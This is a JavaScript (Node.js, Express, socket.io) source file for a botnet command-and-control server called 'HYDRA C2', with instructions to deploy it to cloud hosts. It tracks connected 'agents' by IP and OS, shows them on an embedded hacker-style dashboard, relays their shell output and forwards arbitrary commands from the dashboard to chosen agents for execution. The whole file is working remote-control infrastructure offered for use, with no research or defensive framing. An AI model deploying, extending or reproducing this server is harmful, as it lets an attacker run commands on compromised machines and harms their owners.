// NK HYDRA C2 v7.0 - REAL WORLD SERVER
// DEPLOY THIS TO RENDER/HEROKU/VPS
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// --- EMBEDDED DASHBOARD UI (SERVED ON /) ---
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NK HYDRA C2 // SERVER NODE</title>
    <style>
        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .header { border-bottom: 2px solid #333; padding-bottom: 20px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
        .node { background: #111; border: 1px solid #333; padding: 15px; border-radius: 4px; position: relative; overflow: hidden; }
        .node.online { border-color: #00ff41; }
        .node.offline { border-color: #ff0000; opacity: 0.5; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .bg-green { background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
        .bg-red { background-color: #ff0000; }
        .log-panel { margin-top: 30px; background: #080808; border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; font-size: 12px; color: #888; }
        h1 { margin: 0; font-size: 24px; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>HYDRA C2 [REAL SERVER]</h1>
            <div style="font-size: 12px; color: #666; margin-top: 5px;">STATUS: <span id="server-status" style="color: #00ff41;">ACTIVE</span></div>
        </div>
        <div style="text-align: right;">
             <div style="font-size: 32px; font-weight: bold;" id="agent-count">0</div>
             <div style="font-size: 10px; color: #666;">AGENTS ONLINE</div>
        </div>
    </div>

    <div id="bots" class="grid"></div>

    <div class="log-panel" id="logs">
        <div>[SYSTEM] Hydra Server Initialized. Waiting for incoming connections...</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const botsDiv = document.getElementById('bots');
        const countDiv = document.getElementById('agent-count');
        const logsDiv = document.getElementById('logs');

        function addLog(msg) {
            const div = document.createElement('div');
            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logsDiv.prepend(div);
        }

        socket.on('connect', () => {
            document.getElementById('server-status').innerText = 'CONNECTED TO CORE';
            socket.emit('identify', { type: 'ui', id: 'Web-Dashboard' });
        });

        socket.on('agents_list', (agents) => {
            countDiv.innerText = agents.filter(a => a.status === 'Online').length;
            botsDiv.innerHTML = '';
            
            if(agents.length === 0) {
                botsDiv.innerHTML = '<div style="color:#444; padding:20px;">NO AGENTS CONNECTED</div>';
                return;
            }

            agents.forEach(a => {
                const isOnline = a.status === 'Online';
                const html = `
                    <div class="node ${isOnline ? 'online' : 'offline'}">
                        <div style="font-weight:bold; margin-bottom:5px;">
                            <span class="status-dot ${isOnline ? 'bg-green' : 'bg-red'}"></span>
                            ${a.id}
                        </div>
                        <div style="font-size: 11px; color: #666; margin-bottom:2px;">IP: ${a.ip}</div>
                        <div style="font-size: 11px; color: #666;">OS: ${a.os}</div>
                    </div>
                `;
                botsDiv.innerHTML += html;
            });
        });

        socket.on('agent_event', (evt) => {
            addLog(`EVENT [${evt.type}] from ${evt.agentId}: ${evt.payload}`);
        });
    </script>
</body>
</html>
`;

app.get('/', (req, res) => res.send(dashboardHTML));

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

let agents = [];

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Identify Agent or UI
    socket.on('identify', (data) => {
        // data = { type: 'agent' | 'ui', id, os, ip }
        if(data.type === 'agent') {
            const existing = agents.find(a => a.id === data.id);
            if(existing) {
                existing.socketId = socket.id;
                existing.status = 'Online';
                existing.lastSeen = Date.now();
            } else {
                agents.push({
                    socketId: socket.id,
                    id: data.id || socket.id,
                    type: 'agent',
                    os: data.os || 'Unknown',
                    ip: data.ip || socket.handshake.address,
                    status: 'Online',
                    lastSeen: Date.now()
                });
            }
            // Broadcast update to all connected clients (UIs)
            io.emit('agents_list', agents);
            io.emit('agent_event', { type: 'SYSTEM', agentId: data.id, payload: 'Agent Connected' });
        }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if(agent) {
            agent.status = 'Offline';
            io.emit('agents_list', agents); // Notify UIs
            io.emit('agent_event', { type: 'SYSTEM', agentId: agent.id, payload: 'Agent Disconnected' });
        }
    });

    // Handle Data from Agent (Screenshot, Logs)
    socket.on('stream_log', (data) => {
        // Relay to UIs
        io.emit('agent_event', { type: 'SHELL_OUTPUT', agentId: data.from, payload: data.output });
    });

    // Handle Commands from UI to Agent
    socket.on('exec_cmd', (data) => {
        // data = { targetId, cmd }
        const target = agents.find(a => a.id === data.targetId);
        if(target && target.status === 'Online') {
            io.to(target.socketId).emit('exec', { cmd: data.cmd });
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`HYDRA C2 LISTENING ON PORT ${PORT}`);
});